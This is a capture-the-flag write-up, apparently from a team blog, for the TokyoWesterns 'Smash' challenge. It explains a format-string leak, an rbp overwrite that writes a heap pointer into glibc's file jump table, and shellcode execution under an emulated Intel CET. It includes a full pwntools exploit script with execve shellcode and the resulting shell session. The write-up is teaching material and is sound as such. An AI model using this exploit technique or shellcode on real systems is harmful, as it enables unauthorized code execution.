@@ -1,0 +1,163 @@
+I"�=<p><strong>tl;dr</strong></p>
+
+<ul>
+  <li>Leak with Format String bug.</li>
+  <li>Use the arbitrary heap pointer write to overwrite <code class="language-plaintext highlighter-rouge">__GI__IO_file_jumps</code>.</li>
+  <li>Inject shellode in heap and get code execution in <code class="language-plaintext highlighter-rouge">dfprintf</code>.</li>
+</ul>
+
+<p>&lt;i!–more–&gt;</p>
+
+<p><strong>Challenge Points:</strong> 388
+<strong>Solves:</strong> 9</p>
+
+<p>We really had a great time this weekend playing this year’s edition of TokyoWesterns CTF. In this post I’d like to share the intended solution for the challenge <strong>Smash</strong> which we could not solve during the CTF but the idea and the concept involved is worth sharing.</p>
+
+<h2 id="challenge-description">Challenge description</h2>
+
+<p>To begin with , we’ve been provided with the challenge binary , <code class="language-plaintext highlighter-rouge">libc 2.31</code>, a runner bash script and a folder containing Intel’s tool called Control-flow Enforcement Technology (CET).This was our first tackel with Intel’s CET and the concept involved is truly worth sharing.</p>
+
+<pre><code class="language-gdb">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+</code></pre>
+
+<p>All mitigations except canary have been enabled.</p>
+
+<h2 id="reversing">Reversing</h2>
+
+<ul>
+  <li>The input name function takes 0x20 bytes of user input and then does an <code class="language-plaintext highlighter-rouge">strdup</code> which stores our input on heap.</li>
+  <li>Next , <code class="language-plaintext highlighter-rouge">dprintf</code> is called on our input without any format specifier, hence we can leak required addresses with the format string bug.</li>
+  <li>After this , we’re asked to enter <code class="language-plaintext highlighter-rouge">y</code> or <code class="language-plaintext highlighter-rouge">n</code> and if <code class="language-plaintext highlighter-rouge">y</code> is entered , the program further asks for another <code class="language-plaintext highlighter-rouge">input message</code> and then takes in another 0x38 bytes of input.</li>
+  <li>If <code class="language-plaintext highlighter-rouge">n</code> is entered , the program prints <code class="language-plaintext highlighter-rouge">Bye</code> with dprintf and directly exits.</li>
+</ul>
+
+<p>Pretty straight forward, but where are the bugs?</p>
+
+<h2 id="exploit-development">Exploit development</h2>
+
+<p>We actually have 2 overflows which let us corrupt rbp and pivot to almost anywhere, but wait, CET doesn’t allow us to execute ROP chain directly. We have to find a way to get code execution.</p>
+
+<h3 id="how-intels-cet-works">How Intel’s CET works</h3>
+
+<p>Control-Flow Enforcement Technology promises to guard a binary against attacks such as ROP, JOP etc. It does so by allocating a <code class="language-plaintext highlighter-rouge">shadow stack</code> in mapped memory region. Whenever a function is called, apart from storing the return address on the program’s thread stack , it also stores it on the shadow stack. So whenever the program returns from the function, the return address is comapared with the one stored on the shadow stack , if a match is found, the program executes smoothly,  and if not , the program aborts thus mitigating ROP.</p>
+
+<p>Intel SDE provides an emulation that includes:</p>
+
+<ul>
+  <li>Stack checks</li>
+  <li>Indirect branch checks</li>
+</ul>
+
+<p>From the above discussion, one thing gets clear , every function that is executed in the supervision of CET needs to begin with <code class="language-plaintext highlighter-rouge">endbr64</code>. Let’s just bear that in mind and continue.</p>
+
+<h2 id="in-search-of-arbitrary-write">In search of arbitrary write</h2>
+
+<p>Since we have our required leaks , we can now corrupt rbp with our first overflow in the step where program asks us to enter <code class="language-plaintext highlighter-rouge">y</code> or <code class="language-plaintext highlighter-rouge">n</code>.</p>
+
+<p>An important observation to be made here is that , after reading our input and storing on heap with strdup, the program copies the heap pointer to an offset of <code class="language-plaintext highlighter-rouge">rbp-0x8</code>.</p>
+
+<p>Since , we overwrote rbp with an address of our choice , after the function executes <code class="language-plaintext highlighter-rouge">leave</code> , the rbp will be updated with the value that we specified.</p>
+
+<p>Immediately after that, the following instructions copy the heap pointer storing our input to <code class="language-plaintext highlighter-rouge">rbp-0x8</code>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov    QWORD PTR <span class="o">[</span>rbp-0x8],rax
+mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8]
+</code></pre></div></div>
+
+<p>Thus , we have an arbitrary write of a heap pointer.</p>
+
+<h2 id="defeating-cet">Defeating CET</h2>
+
+<p>After analyzing a bit ,  we found out that the emulator that the CTF has provided us with does not check for the <code class="language-plaintext highlighter-rouge">NX</code> bit and few pages have been marked <code class="language-plaintext highlighter-rouge">read-write-executable</code> allowing us to now inject shellcode.</p>
+
+<p>Now that we can execute shellode, we have to now select a target to get code execution.</p>
+
+<h2 id="dprintf-to-the-rescue">dprintf to the rescue</h2>
+
+<p>One important aspect of dprintf is that it uses a <code class="language-plaintext highlighter-rouge">temporary file structure</code> to carry out it’s operations. With file structure operations, we can find out apt targets to get code execution. One such target function pointer is <code class="language-plaintext highlighter-rouge">_IO_new_file_finish</code> which is called internally inside <code class="language-plaintext highlighter-rouge">dprintf</code>.</p>
+
+<p>So , now our plan is :</p>
+
+<ul>
+  <li>Overwrite rbp to point to <code class="language-plaintext highlighter-rouge">_IO_new_file_finish + 8</code>.</li>
+  <li>Copy heap address to <code class="language-plaintext highlighter-rouge">_IO_new_file_finish</code>.</li>
+  <li>Fill heap with shellcode as CET doesn’t implement NX.</li>
+  <li>Get code execution in dprintf.</li>
+</ul>
+
+<p>Here’s the full exploit code.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.31.so'</span><span class="p">,</span><span class="n">checksec</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"pwn01.chal.ctf.westerns.tokyo"</span><span class="p">,</span><span class="mi">29246</span><span class="p">)</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./smash"</span><span class="p">)</span>
+
+<span class="n">reu</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">rel</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+<span class="n">re</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'%p '</span><span class="o">*</span><span class="mi">9</span><span class="p">)</span>
+    <span class="n">re</span><span class="p">(</span><span class="mi">55</span><span class="p">)</span>
+    <span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+    <span class="n">re</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1216</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"code = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
+    <span class="n">re</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+    <span class="n">target_stack</span> <span class="o">=</span> <span class="n">code</span> <span class="o">+</span> <span class="mh">0x40e8</span> <span class="c1">#to be changed
+</span>    <span class="n">inp</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0x60</span>
+    <span class="n">IO_file_jumps</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ed4a0</span>
+    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">code</span> <span class="o">+</span> <span class="mh">0x000013d3</span>
+    <span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf3\x0f\x1e\xfa</span><span class="s">"</span> <span class="c1"># endbr64
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">"</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x30</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_file_jumps</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s">'[y/n] '</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c1">#sla('message &gt; ','write to shadow')
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Remember that the shellcode has to be started with <code class="language-plaintext highlighter-rouge">endbr64</code> instruction to bypass the indirect branch instruction check.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">[+] Opening connection to pwn01.chal.ctf.westerns.tokyo on port 29246: Done
+[!] Skipping debug attach since context.noptrace==True
+[*] stack = 0x7fffc7eb4d00
+[*] code = 0x55a74550c000
+[*] libc = 0x7f498f5bb000
+[*] Switching to interactive mode
+
+Bye!
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">flag.txt
+run.sh
+sde
+sde.tgz
+smash
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>flag.txt
+<span class="go">TWCTF{17_15_ju57_4n_3mul470r,n07_r34l_CET}
+</span></code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This was one of the most interesting challenges I had come across in a while. The idea of a faulty emulator and CET was really cool. Kudos to team TokyoWesterns for such a cool challenge and such an awesome CTF.</p>
+:ET
